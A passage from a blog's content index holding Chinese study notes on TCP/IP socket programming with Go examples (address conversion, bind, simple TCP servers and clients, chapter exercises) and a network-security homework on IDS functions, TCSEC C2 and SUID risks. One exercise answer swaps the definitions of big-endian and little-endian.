32-bit integer in network byte order. // If the IP address is valid, it stores the result in the given *uint32 and returns true. // If the IP address is invalid, it returns false. func inet_aton(ipStr string, ip *uint32) bool { parsedIP := net.ParseIP(ipStr) if parsedIP == nil { return false } parsedIP = parsedIP.To4() if parsedIP == nil { return false } *ip = binary.BigEndian.Uint32(parsedIP) return true } func main() { addr := \u0026#34;127.232.124.79\u0026#34; var ip uint32 if !inet_aton(addr, \u0026amp;ip) { log.Fatalln(\u0026#34;Conversion error\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, ip) } } inet_aton 上述运行结果无关紧要,更重要的是大家要熟练掌握该函数的调用方法。最后再介绍一个与inet_aton函数正好相反的函数,此函数可以把网络字节序整数型IP地址转换成我们熟悉的字符串形式。\n1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; char * inet_ntoa(struct in_addr adr); //成功时返回转换的字符串地址值,失败时返回-1。 该函数将通过参数传入的整数型IP地址转换为字符串格式并返回。 但调用时需小心,返回值类型为char指针。返回字符串地址意味着字符串已保存到内存空间,但该函数未向程序员要求分配内存,而是在内部申请了内存并保存了字符串。也就是说,调用完该函数后,应立即将字符串信息复制到其他内存空间。总之,再次调用inet_ntoa函数前返回的字符串地址值是有效的。若需要长期保存,则应将字符串复制到其他内存空间。\nGo语言标准库中并没有直接提供对C语言中的网络地址转换函数的封装。如果要在Go中实现类似的功能，可以使用net包中的IP和IPv4类来进行IP地址的转换和操作。以下是一个简单的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main1() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 ip1 := net.IPv4(byte(addr1\u0026gt;\u0026gt;24), byte(addr1\u0026gt;\u0026gt;16), byte(addr1\u0026gt;\u0026gt;8), byte(addr1)) ip2 := net.IPv4(byte(addr2\u0026gt;\u0026gt;24), byte(addr2\u0026gt;\u0026gt;16), byte(addr2\u0026gt;\u0026gt;8), byte(addr2)) fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, ip1.String()) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, ip2.String()) } 用go自行写的 inet_aton函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) // inet_ntoa converts a 32-bit integer in network byte order into a dotted-decimal IP address. func inet_ntoa(ipInt uint32) string { ipBytes := make([]byte, 4) ipBytes[0] = byte(ipInt \u0026gt;\u0026gt; 24) ipBytes[1] = byte(ipInt \u0026gt;\u0026gt; 16) ipBytes[2] = byte(ipInt \u0026gt;\u0026gt; 8) ipBytes[3] = byte(ipInt) return net.IP(ipBytes).String() } func main() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, inet_ntoa(addr1)) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, inet_ntoa(addr2)) } 网络地址初始化 上述代码中,memset函数将每个字节初始化为同一值:第一个参数为结构体变量addr的地址值,即初始化对象为addr;第二个参数为0,因此初始化为0;最后一个参数中传入addr的长度,因此addr的所有字节均初始化为0。这么做是为了将sockaddr_in结构体的成员sin_zero初始化为0。 另外,最后一行代码调用的atoi函数把字符串类型的值转换成整数型。总之,上述代码利用字符串格式的IP地址和端口号初始化了sockaddr_in结构体变量。 另外,代码中对IP地址和端口号进行了硬编码,这并非良策,因为运行环境改变就得更改代码。因此,我们运行示例main函数时传入IP地址和端口号。\n客户端地址信息初始化 上述网络地址信息初始化过程主要针对服务器端而非客户端。给套接字分配IP地址和端口号主要是为下面这件事做准备:\n“请把进入IP 211.217.168.13、9190端口的数据传给我!” 反观客户端中连接请求如下:\n“请连接到IP 211.217.168.13、9190端口!” 请求方法不同意味着调用的函数也不同。服务器端的准备工作通过bind函数完成,而客户端则通过connect函数完成。因此,函数调用前需准备的地址值类型也不同。服务器端声明sockaddr_in 结构体变量,将其初始化为赋子服务器端IP和套接字的端口号,然后调用bind函数;而客户端则声明sockaddr_in结构体,并初始化为要与之连接的服务器端套接字的IP和端口号,然后调用connect函数。\nINADDR_ANY 与之前方式最大的区别在于,利用常数INADDR_ANY分配服务器端的IP地址。若采用这种方式,则可自动获取运行服务器端的计算机IP地址,不必亲自输人。而且,若同一计算机中已分配多个IP地址(多宿主(Multi-homed)计算机,一般路由器属于这一类),则只要端口号一致, 就可以从不同IP地址接收数据。因此,服务器端中优先考虑这种方式。而客户端中除非带有一部分服务器端功能,否则不会采用。\n初始化服务器端套接字时应分配所属计算机的IP地址,因为初始化时使用的IP地址非常明确,那为何还要进行IP初始化呢?如前所述,同一计算机中可以分配多个IP地址, 实际IP地址的个数与计算机中安装的NIC的数量相等。即使是服务器端套接字,也需要决定应接收哪个IP传来的(哪个NIC传来的)数据。因此,服务器端套接字初始化过程中要求IP地址信息。另外,若只有1个NIC,则直接使用INADDR_ANY。\n在 Go 中，你可以使用空字符串 \u0026quot;\u0026quot; 作为 IP 地址来代表 INADDR_ANY，这表示监听所有的 IP 地址。以下是一个简单的 TCP 服务器示例，它监听所有的 IP 地址和一个特定的端口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:8080\u0026#34;) if err != nil { log.Fatal(err) } defer listener.Close() for { conn, err := listener.Accept() if err != nil { log.Fatal(err) } go handleConnection(conn) } } func handleConnection(conn net.Conn) { // Handle the connection defer conn.Close() } 在这个示例中，net.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;:8080\u0026quot;) 会监听所有的 IP 地址和端口 8080。当有新的连接到来时，listener.Accept() 会返回一个新的 net.Conn 对象，然后你可以在新的 goroutine 中处理这个连接。\n向套接字分配网络地址 既然已讨论了sockaddr_in结构体的初始化方法,接下来就把初始化的地址信息分配给套接字。bind函数负责这项操作。\n1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int bind(int sockfd, struct sockaddr * myaddr, socklen_t addrLen); //成功时返回0,失败时返回-1。 //sockfd 要分配地址信息(IP地址和端口号)的套接字文件描述符。 //myaddr 存有地址信息的结构体变量地址值。 //addrlen 第二个结构体变量的长度。 在 Go 语言中，Bind 函数是 syscall 包中的一个函数，用于将本地协议地址 addr 绑定到文件描述符 fd。函数原型如下：\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } 其中，fd 是通过 Socket 函数获取的文件描述符，addr 是一个实现了 Sockaddr 接口的网络地址。\n两者的主要区别在于：\nGo 的 Bind 函数使用了接口 Sockaddr，这使得你可以传入任何实现了 Sockaddr 接口的类型，如 SockaddrInet4、SockaddrInet6、SockaddrUnix 等。而 C 的 bind 函数需要一个指向 struct sockaddr 的指针，需要手动进行类型转换。\nGo 的 Bind 函数返回一个错误值，你可以直接检查这个错误值来确定 Bind 函数是否成功。而 C 的 bind 函数返回一个整数，需要检查这个整数和 errno 来确定 bind 函数是否成功。\nGo 的 Bind 函数处理了一些底层的细节，如网络字节序的转换。而在 C 中，需要手动进行这些操作。\n1 2 3 4 5 6 7 func bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) { _, _, e1 := syscall(abi.FuncPCABI0(libc_bind_trampoline), uintptr(s), uintptr(addr), uintptr(addrlen)) if e1 != 0 { err = errnoErr(e1) } return } 在 Go 语言的 syscall 包中，Bind 和 bind 函数都是用来将本地协议地址绑定到文件描述符的。 bind 函数是一个私有的函数，它直接接受一个文件描述符和一个 unsafe.Pointer 类型的地址作为参数，然后调用系统调用 bind。这个函数通常不会直接被用户代码调用，而是被 Bind 函数调用。 bind 函数是通过 syscall 函数调用 libc_bind_trampoline 函数来实现的，这个函数是一个跳板函数，它会跳转到动态链接库中的 bind 函数。 总的来说，Bind 函数提供了一个更高级的接口，它处理了类型转换和错误处理，而 bind 函数是一个更底层的接口，它直接调用系统调用。\n3.5 基于Windows的实现 略\n3.6 习题 IP地址族IPv4和IPv6有何区别?在何种背景下诞生了IPv6?\nIPv4与IPv6的差别主要是表示IP地址所用的字节数,目前通用的地址族为IPv4。IPv6是为了应对2010年前后IP地址耗尽的问题而提出的标准。\n通过IPv4网络ID、主机ID及路由器的关系说明向公司局域网中的计算机传输数据的过程。\n网络地址(网络ID)是为区分网络而设置的一部分IP地址。假设向WWW.SEMI.COM公司传输数据,该公司内部构建了局域网,把所有计算机连接起来。因此,首先应向SEMI.COM网络传输数据,也就是说,并非一开始就浏览所有4字节IP地址,进而找到目标主机;而是仅浏览4字节IP地址的网络地址,先把数据传到SEMI.COM的网络。SEMI.COM网络(构成网络的路由器)接收到数据后,浏览传输数据的主机地址(主机ID)并将数据传给目标计算机。\n套接字地址分为IP地址和端口号。为什么需要地址和端口号?或者说,通过IP可以区分哪些对象?通过端口号可以区分哪些对象?\n套接字地址分为IP地址和端口号，是为了在网络中唯一标识一个通信端点。IP地址用于区分不同的主机，即不同的计算机。端口号用于区分同一主机上的不同进程，即不同的应用程序。\n请说明IP地址的分类方法,并据此说出下面这些IP地址的分类。 214.121.212.102 （C类） 120.101.122.89 （A类） 129.78.102.211 （B类） 计算机通过路由器或交换机连接到互联网。请说出路由器和交换机的作用。\n若想构建网络,需要一种物理设备完成外网与本网主机之间的数据交换,这种设备便是路由器或交换机。\n什么是知名端口?其范围是多少?知名端口中具有代表性的HTTP和FTP端口号各是多少?\n0-1023是知名端口(Well-known PORT),一般分配给特定应用程序。HTTP的端口号是80，FTP的端口号是21\n向套接字分配地址的bind函数原型如下: int bind(int sockfd, struct sockaddr *myaddr,socklen_t addrlen); 而调用时则用bind(serv_sock,(struct sockaddr *)\u0026amp;sery_addr, sizeof (serv_addr)); 此处serv_addr为sockaddr_in结构体变量。与函数原型不同,传入的是sockaddr_in结构体变量,请说明原因。\nsockaddr_in 结构体是 sockaddr 结构体的一种特定类型，因此可以通过类型转换将其传递给 bind 函数。这是因为 sockaddr_in 结构体包含了 sockaddr 结构体的所有成员，所以在实际调用中可以将 sockaddr_in 结构体的指针转换为 sockaddr 结构体的指针，从而符合 bind 函数的参数要求。\n请解释大端序、小端序、网络字节序,并说明为何需要网络字节序。\n大端序（Big-Endian）：数据的低位字节存储在内存的低地址，高位字节存储在内存的高地址。 小端序（Little-Endian）：数据的高位字节存储在内存的低地址，低位字节存储在内存的高地址。 网络字节序（Network Byte Order）：是指在网络传输中采用的字节序。网络字节序采用大端序，这是因为大端序与人类阅读数字的顺序一致，因此更容易理解和识别。 网络字节序是网络传输的标准，因此在网络传输中采用网络字节序可以确保数据在不同计算机之间正确传输。 大端序计算机希望把4字节整数型数据12传递到小端序计算机。请说出数据传输过程中发生的字节序变换过程。\n数据 12 在网络传输过程中的字节序没有发生变化，仍然是大端序。小端序计算机在接收到数据后，需要将数据中的高位字节和低位字节进行交换，以将数据转换为小端序。\n大端序 网络字节序 小端序 0x0000000C 0x0000000C 0x0C000000 怎样表示回送地址?其含义是什么?如果向回送地址传输数据将发生什么情况? 回送地址（loopback address）是指本地主机的 IP 地址。在 IPv4 中，回送地址为 127.0.0.1。 回送地址用于本地主机之间的通信。如果向回送地址传输数据，则数据将会被本地主机接收并处理。 ","date":"2023-11-15T20:09:07+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第三章笔记"},{"content":"得分：10/10\n第六讲 IDS有哪些主要功能?\n网络流量的跟踪与分析功能：跟踪用户进出网络的所有活动，实时检测并分析用户在系统中的活动状态；实时统计网络流量，检测拒绝服务攻击等异常行为。\n已知攻击特征的识别功能：识别特定类型的攻击，并向控制台报警，为网络防护提供依据。根据定制的条件过滤重复告警事件，减轻传输与响应的压力。\n异常行为的分析、统计与响应功能：分析系统的异常行为模式，统计异常行为，并对异常行为做出响应。\n特征库的在线和离线升级功能：提供入侵检测规则的在线和离线升级，实时更新入侵特征库，不断提高IDS的入侵检测能力。\n数据文件的完整性检查功能：检查关键数据文件的完整性，识别并报告数据文件的改动情况。\n自定义的响应功能：定制实时响应策略；根据用户定义，经过系统过滤，对告警事件及时响应。\n系统漏洞的预报警功能：对新发现或新公布的系统漏洞特征进行预报警。\nIDS探测器集中管理功能：通过控制台收集探测器的状态和告警信息，控制各个探测器的行为。\n简述误用检测和异常检测。\n误用检测技术又称基于知识或特征的检测技术。它假定所有入侵行为和手段(及其变种)都能够表达为一种模式或特征，并对已知的入侵行为和手段进行分析，提取入侵特征，构建攻击模式或攻击签名，通过系统当前状态与攻击模式或攻击签名的匹配判断入侵行为。误用检测是最成熟、应用最广泛的技术。 异常检测技术又称为基于行为的入侵检测技术，用来检测系统（主机或网络）中的异常行为。 总结NIDS的脆弱性。\n检测的工作量很大：NIDS需要高效的检测方法和大量的系统资源。容易遭受DoS攻击。 检测方法局限性：特征匹配方法有其固有缺陷，难以完全检测入侵行为。 网络协议复杂性：NIDS难以精确分析复杂的网络协议。 系统实现差异：NIDS难以完全兼容不同系统的实现方式。 简述网络安全态势感知系统。\n网络安全态势感知系统可以看成是基于分布式入侵检测系统的综合安全监控系统，具有入侵检测、安全状态可视化展示、安全状态理解及趋势分析预测，以及网络监视和网络控制等功能。\n第七讲 简述TCSEC(受信计算机系统评测标准)标准的C2安全级4项关键功能。\n安全登录机制 要求系统提供强大的用户身份验证机制，防止未经授权的用户登录系统。\n自主访问控制机制 要求系统提供自主访问控制机制，允许系统管理员根据需要对系统资源进行访问控制。\n安全审计机制 系统必须提供安全审计机制，以记录系统的关键操作，以便在发生安全事件时进行调查。\n对象重用保护机制 对象重用保护机制就是残留信息的处理机制，即：阻止一个用户利用或阅读另一个用户已删除的数据，或访问另一个用户曾经使用并释放的内存。\n在哪些情况下可能会发生输入验证攻击。\n程序无法辨认语法上不正确的输入。 模块接受了无关的输入。 模块没有能够处理遗漏的输入域。 发生了域值相关性错误。 为什么root对其可执行文件设置用户ID许可会带来严重的安全隐患?\n因为当某可执行文件是root创建的，如果设置了SUID，而该可执行文件又被赋予了其他普通用户的可执行权限，则该程序被任何用户运行时，对应的进程的euid是root，该进程可以访问任何文件。\n","date":"2023-11-15T18:44:57+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/","title":"网络安全作业4"},{"content":"2.1 套接字协议及其数据传输特性 协议 如果相隔很远的两人想展开对话,必须先决定对话方式。如果一方使用电话,那么另一方也只能使用电话,而不是书信。可以说,电话就是两人对话的协议。协议是对话中使用的通信规则, 把上述概念拓展到计算机领域可整理为“计算机间对话必备通信规则”。\n创建套接字 1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int socket (int domain, int type, int protocol); //成功时返回文件描述符,失败时返回-1。 //domain 套接字中使用的协议族(Protocol Family)信息。 //type 套接字数据传输类型信息。 //protocol 计算机间通信中使用的协议信息。 在 Go 语言的 syscall 包中，Socket 函数是对底层 socket 系统调用的封装。这样做的目的是为了提供一个更加 Go 风格（例如错误处理）的接口，同时隐藏一些底层细节。\nSocket 函数内部调用了 socket 函数。socket 函数直接执行了系统调用，并返回了原始的结果，包括一个文件描述符和一个错误号。然后 Socket 函数将这些原始结果转换为 Go 风格的结果：如果系统调用成功，它返回一个文件描述符和一个 nil 错误；如果系统调用失败，它返回一个 -1 文件描述符和一个非 nil 错误。\n这样做的好处是，对于大多数 Go 程序员来说，他们只需要关心 Socket 函数，而不需要了解底层的 socket 系统调用和错误处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // Socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 // domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 // typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 // proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 func Socket(domain, typ, proto int) (fd int, err error) { // 如果 domain 是 AF_INET6（即，我们正在尝试创建一个 IPv6 套接字）， // 但是 SocketDisableIPv6 为 true（即，我们禁用了 IPv6），则返回错误 EAFNOSUPPORT。 if domain == AF_INET6 \u0026amp;\u0026amp; SocketDisableIPv6 { return -1, EAFNOSUPPORT } // 调用底层的 socket 函数创建套接字。 fd, err = socket(domain, typ, proto) return } // socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 // domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 // typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 // proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 // rawSyscall 函数执行一个底层的系统调用，其参数是系统调用的编号和参数。 // 如果系统调用失败，它返回一个非零的错误号 e1，我们将其转换为 Go 的 error 类型并返回。 func socket(domain int, typ int, proto int) (fd int, err error) { r0, _, e1 := rawSyscall(abi.FuncPCABI0(libc_socket_trampoline), uintptr(domain), uintptr(typ), uintptr(proto)) fd = int(r0) if e1 != 0 { err = errnoErr(e1) } return } 协议族(Protocol Family) 通过socket函数的第一个参数传递套接字中使用的协议分类信息。此协议分类信息称为协议族。 原文给的c语言头文件中的分类 在 Go 语言的 syscall 包中，domain 参数用于指定套接字的协议族。以下是一些常见的 domain 值：\n值 描述 AF_INET IPv4 网络协议 AF_INET6 IPv6 网络协议 AF_UNIX UNIX 域套接字 AF_NETLINK 内核用户接口设备 AF_PACKET 低级包接口 AF_CAN Controller Area Network AF_BLUETOOTH 蓝牙设备 请注意，不是所有的 domain 值都在所有的平台上可用。具体可用的 domain 值取决于你的操作系统和平台。\n套接字类型(Type) 套接字类型指的是套接字的数据传输方式,通过socket函数的第二个参数传递,只有这样才能决定创建的套接字的数据传输方式。这种说法可能会使各位感到疑惑。已通过第一个参数传递了协议族信息,还要决定数据传输方式?问题就在于,决定了协议族并不能同时决定数据传输方式,换言之,socket数第一个参数PF_INET协议族中也存在多种数据传输方式。\n面向连接的套接字(SOCK_STREAM) 如果向socket函数的第二个参数传递SOCK_STREAM,将创建面向连接的套接字。面向连接的套接字到底具有哪些特点呢?\n套接字连接必须一一对应 传输过程中数据不会消失 按序传输数据 传输的数据不存在数据边界 收发数据的套接字内部有缓冲(buffer),简言之就是字节数组。通过套接字传输的数据将保存到该数组。因此,收到数据并不意味着马上调用read函数。只要不超过数组容量,则有可能在数据填充满缓冲后通过1次read函数调用读取全部,也有可能分成多次read函数调用进行读取。也就是说,在面向连接的套接字中,read函数和write函数的调用次数并无太大意义。所以说面向连接的套接字不存在数据边界。\n套接字缓冲已满是否意味着数据丢失 之前讲过,为了接收数据,套接字内部有一个由字节数组构成的缓冲。如果这个缓冲被接收的数据填满会发生什么事情?之后传递的数据是否会丢失? 首先调用read函数从缓冲读取部分数据,因此,缓冲并不总是满的。但如果read函数读取速度比接收数据的速度慢,则缓冲有可能被填满。此时套接字无法再接收数据, 但即使这样也不会发生数据丢失,因为传输端套接字将停止传输。也就是说,面向连接的套接字会根据接收端的状态传输数据,如果传输出错还会提供重传服务。因此,面向连接的套接字除特殊情况外不会发生数据丢失。\n面向消息的套接字(SOCK_DGRAM) 如果向socket函数的第二个参数传递SOCK_DGRAM,则将创建面向消息的套接字。面向消息的套接字可以比喻成高速移动的摩托车快递。\n强调快速传输而非传输顺序 传输的数据可能丢失也可能损毁 传输的数据有数据边界 限制每次传输的数据大小 众所周知,快递行业的速度就是生命。用摩托车发往同一目的地的2件包裹无需保证顺序, 只要以最快速度交给客户即可。这种方式存在损坏或丢失的风险,而且包裹大小有一定限制。因此,若要传递大量包裹,则需分批发送。另外,如果用2辆摩托车分别发送2件包裹,则接收者也需要分2次接收。这种特性就是“传输的数据具有数据边界”。\n面向消息的套接字比面向连接的套接字具有更快的传输速度,但无法避免数据丢失或损毁。另外,每次传输的数据大小具有一定限制,并存在数据边界。存在数据边界意味着接收数据的次数应和传输次数相同。面向消息的套接字特性总结如下: “不可靠的、不按序传递的、以数据的高速传输沟目的的套接字\u0026quot;\n最终选择的协议 下面讲解socket函数的第三个参数,该参数决定最终采用的协议。 前面已经通过socket函数的前两个参数传递了协议族信息和套接字数据传输方式,这些信息还不足以决定采用的协议吗?为什么还需要传递第3个参数呢? 传递前两个参数即可创建所需套接字。所以大部分情况下可以向第三个参数传递0,除非遇到以下这种情况: “同一协议族中存在多个数据传输方式相同的协议”数据传输方式相同,但协议不同。此时需要通过第三个参数具体指定协议信息。\nTCP套接字示例 tcp_server.go (系统函数调用版)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 2 { fmt.Printf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } port, _ := strconv.Atoi(os.Args[1]) //1.创建一个 TCP 套接字。 fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) if err != nil { fmt.Printf(\u0026#34;socket() error: %v\u0026#34;, err) } //2.将套接字绑定到指定的 IP 地址和端口号。 // 创建一个 SockaddrInet4 结构体实例，并设置端口号 servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} // 将 IP 地址设置为 0.0.0.0，这样服务器可以接受来自任何客户端的连接 copy(servAddr.Addr[:], []byte{0, 0, 0, 0}) err = syscall.Bind(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;bind() error: %v\u0026#34;, err) } //3.将套接字转为可接收连接状态 err = syscall.Listen(fd, 10) if err != nil { log.Fatalf(\u0026#34;listen() error: %v\u0026#34;, err) } //4.Accept()接收连接 connFd, _, err := syscall.Accept(fd) if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()发送信息 message := \u0026#34;Hello world!\u0026#34; _, err = syscall.Write(connFd, []byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } syscall.Close(connFd) syscall.Close(fd) } tcp_clinet.go 更改read函数调用方式，在客户端中分多次调用read函数以接收服务器端发送的全部数据,以验证tcp传输的数据不存在数据边界。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] portStr := os.Args[2] port, err := strconv.Atoi(portStr) if err != nil { log.Fatalf(\u0026#34;Invalid port number: %s\\n\u0026#34;, portStr) } fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // 设置服务器的地址和端口 servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} copy(servAddr.Addr[:], net.ParseIP(ip).To4()) // 使用 syscall.Connect 函数将套接字连接到服务器 err = syscall.Connect(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;connect() error: %v\u0026#34;, err) } // 使用 syscall.Read 接收信息 buf := make([]byte, 1024) message := make([]byte, 0) for { n, err := syscall.Read(fd, buf) if err != nil { if err != io.EOF { log.Fatalf(\u0026#34;Read error: %v\u0026#34;, err) } break } if n == 0 { break } message = append(message, buf[:n]...) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) fmt.Printf(\u0026#34;Function read() read %d bytes\\n\u0026#34;, len(message)) syscall.Close(fd) } 运行\n1 2 3 4 5 6 7 8 go build -o ch2/tcpServer/tcp_server ch2/tcpServer/tcp_server.go go build -o ch2/tcpClient/tcp_client ch2/tcpClient/tcp_client.go ./ch2/tcpServer/tcp_server 8888 ./ch2/tcpClient/tcp_client 127.0.0.1 8888 Message from server: Hello world! Function read() read 12 bytes 2.2 Windows平台啊下的实现及验证 略\n2.3 习题 什么是协议?在收发数据中定义协议有何意义?\n面向连接的TCP套接字传输特性有3点,请分别说明。\n无数据边界 传输过程中数据不会消失 按序传输 下列哪些是面向消息的套接字的特性? a. 传输数据可能丢失 b. 没有数据边界(Boundary) （面向连接） c. 以快速传递为目标 d. 不限制每次传递数据的大小 （限制大小） e. 与面向连接的套接字不同,不存在连接的概念\n下列数据适合用哪类套接字传输?并给出原因。\na. 演唱会现场直播的多媒体数据(面向消息) 因为面向消息的套接字以快速传递为目标，适合传输多媒体数据，即使传输数据可能丢失也不会影响整体效果。 b. 某人压缩过的文本文件(面向连接) 因为面向连接的套接字可以保证数据的可靠传输，适合传输对数据完整性要求较高的文本文件。 c. 网上银行用户与银行之间的数据传递(面向连接) 面向连接的套接字提供可靠的、按顺序传送的数据传输服务，适合对数据完整性和安全性要求较高的网上银行交易。 何种类型的套接字不存在数据边界?这类套接字接收数据时需要注意什么? 面向连接的套接字不存在数据边界。面向连接的TCP套接字在接收数据时需要注意处理粘包和拆包的问题，确保按照应用层协议的要求正确解析和处理接收到的数据\ntcp_server.c和tcp_client.c中需多次调用read函数读取服务器端调用I次write函数传递的字符串。更改程序,使服务器端多次调用(次数自拟)write函数传输数据,客户端调用1 次read函数进行读取。为达到这一目的,客户端需延迟调用read函数,因为客户端要等待服务器端传输所有数据。Windows和Linux都通过下列代码延迟read或recv函数的调用。for(1=0;i\u0026lt;3000;i++) printf(\u0026ldquo;wait time %d \\n\u0026rdquo;, i); 让CPU执行多余任务以延迟代码运行的方式称为 “Busy Waiting”。使用得当即可推迟函数调用。\n","date":"2023-11-11T12:48:30+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第二章笔记"},{"content":"1.1 理解网络和套接字 套接字 套接字（socket）是计算机网络中进程间通信的一种机制，它将进程间通信抽象为一个端点，该端点由一个IP地址和一个端口号来标识。 套接字是网络数据传输用的软件设备。网络编程又称为套接字编程。\n编写\u0026quot; Hello world! \u0026quot; 服 务 器 端 网络编程中接受连接请求的套接字创建过程可整理如下。\n第一步:调用s o c k e t 函数创建套接字。 第二步:调用b i n d 函数分配E地址和端口号。 第三步:调用l i s t e n 函数转为可接收请求状态。 第四步:调用a c c e p t 函数受理连接请求。 hello_server.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { //检查参数 if len(os.Args) != 2 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } //设置监听端口和信息 message := \u0026#34;Hello world!\u0026#34; port := os.Args[1] //当你调用 net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) 时，Go 会执行以下操作： //1.创建一个 TCP 套接字。 //2.将套接字绑定到指定的 IP 地址和端口号。 //3.将套接字转为可接收连接状态 listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) if err != nil { log.Fatalf(\u0026#34;socket() error: %v\u0026#34;, err) } //延迟关闭监听 defer listener.Close() //循环监听 for { //4.Accept()接收连接 conn, err := listener.Accept() if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()发送信息 _, err = conn.Write([]byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } conn.Close() } } client 创建套接字,但此时套接字并不马上分为服务器端和客户端。如果紧接着调用bind和listen函数,将成为服务器端套接字;如果调用connect函数将成为客户端套接字。\nhello_client.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] port := os.Args[2] address := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, ip, port) //1.创建一个 TCP 套接字。 //2.调用 Connect() 连接到指定的 IP 地址和端口号。 conn, err := net.Dial(\u0026#34;tcp\u0026#34;, address) if err != nil { log.Fatalf(\u0026#34;Failed to connect to server: %v\u0026#34;, err) } defer conn.Close() //net.Conn 对象来读取服务器发送的消息 message, err := io.ReadAll(conn) if err != nil { 